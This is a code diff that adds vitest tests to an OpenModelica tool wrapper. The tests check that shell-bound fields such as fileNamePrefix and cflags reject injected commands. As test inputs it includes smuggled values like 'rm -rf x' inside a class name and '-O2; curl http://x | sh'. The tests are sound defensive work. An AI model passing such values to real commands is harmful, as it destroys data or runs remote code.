@@ -9,6 +9,11 @@
  * the file and the schema is another, and a field declared `z.string()` still
  * compiles. So the sources are read back: a field a command emits unquoted is
  * declared with a constrained atom.
+ *
+ * A quoted argument is read back too, for the layer past OMC. OMC builds a
+ * makefile and a compiler invocation out of `fileNamePrefix`, `cflags` and
+ * `simflags` and hands those to `/bin/sh` (issue #674), where the quoting that
+ * kept them inside the OMC argument counts for nothing.
  */
 
 import { readdir, readFile } from "node:fs/promises";
@@ -18,6 +23,7 @@ import { fileURLToPath } from "node:url";
 import { describe, expect, it } from "vitest";
 
 import type { CallContext } from "./_shared/callContext.js";
+import { classNameToFilePrefix } from "./_shared/fields.js";
 import { REGISTRY } from "./registry.js";
 
 const API_DIR = join(dirname(fileURLToPath(import.meta.url)), "api");
@@ -130,6 +136,19 @@ function isConstrained(src: string, field: string): boolean {
   );
 }
 
+/**
+ * Fields OMC forwards to a shell, and the atom each is held to.
+ *
+ * `options` is absent although `simulate`'s reaches the same place: the name is
+ * also `setCommandLineOptions`', which sets OMC's own switches and reaches no
+ * makefile. That one is pinned by name below.
+ */
+const SHELL_BOUND: Record<string, string> = {
+  fileNamePrefix: "fileNamePrefix",
+  cflags: "shellFlags",
+  simflags: "shellFlags",
+};
+
 async function wrapperSources(): Promise<[string, string][]> {
   const entries = await readdir(API_DIR, {
     recursive: true,
@@ -223,5 +242,68 @@ describe("an argument that would close the command", () => {
     expect(commands).toEqual([
       "addConnection(a.p, b.p, Demo.MSD, annotate=Line())",
     ]);
+  });
+});
+
+describe("a field OMC forwards to a shell", () => {
+  it("is declared with an atom that refuses a shell word", async () => {
+    const unconstrained: string[] = [];
+    let checked = 0;
+    for (const [file, src] of await wrapperSources()) {
+      for (const [field, atom] of Object.entries(SHELL_BOUND)) {
+        if (!new RegExp(`^\\s+${field}:`, "m").test(src)) continue;
+        checked += 1;
+        if (!new RegExp(`\\b${field}:\\s*${atom}\\b`).test(src)) {
+          unconstrained.push(`${file}: ${field}`);
+        }
+      }
+    }
+
+    expect(unconstrained).toEqual([]);
+    expect(checked).toBeGreaterThanOrEqual(4);
+  });
+
+  it("holds simulate's `options` to the same atom", async () => {
+    const src = await readFile(
+      join(API_DIR, "execution", "simulate.ts"),
+      "utf8",
+    );
+    expect(src).toMatch(/\boptions: shellFlags\b/);
+  });
+});
+
+/**
+ * A class name may be a Q-IDENT, which lexes as one Modelica token and so
+ * carries anything but a quote or a backslash. `modelicaName` admits it, the
+ * diagram panel derives a `fileNamePrefix` from it, and OMC pastes that into a
+ * makefile.
+ */
+describe("a value that would reach a shell", () => {
+  const HOSTILE = "Pkg_'a; rm -rf x'_Model";
+
+  it("never reaches the wrapper that would build the command", () => {
+    expect(() =>
+      REGISTRY.simulate.inputSchema.parse({
+        typeName: "Demo.MSD",
+        fileNamePrefix: HOSTILE,
+      }),
+    ).toThrow();
+
+    expect(() =>
+      REGISTRY.simulate.inputSchema.parse({
+        typeName: "Demo.MSD",
+        cflags: "-O2; curl http://x | sh",
+      }),
+    ).toThrow();
+  });
+
+  it("leaves the same call working on a derived prefix", () => {
+    const input = REGISTRY.simulate.inputSchema.parse({
+      typeName: "Demo.MSD",
+      fileNamePrefix: classNameToFilePrefix("Pkg.'a; rm -rf x'.Model"),
+      cflags: "-O2 -march=native",
+    });
+
+    expect(input).toMatchObject({ fileNamePrefix: "Pkg__a__rm__rf_x__Model" });
   });
 });
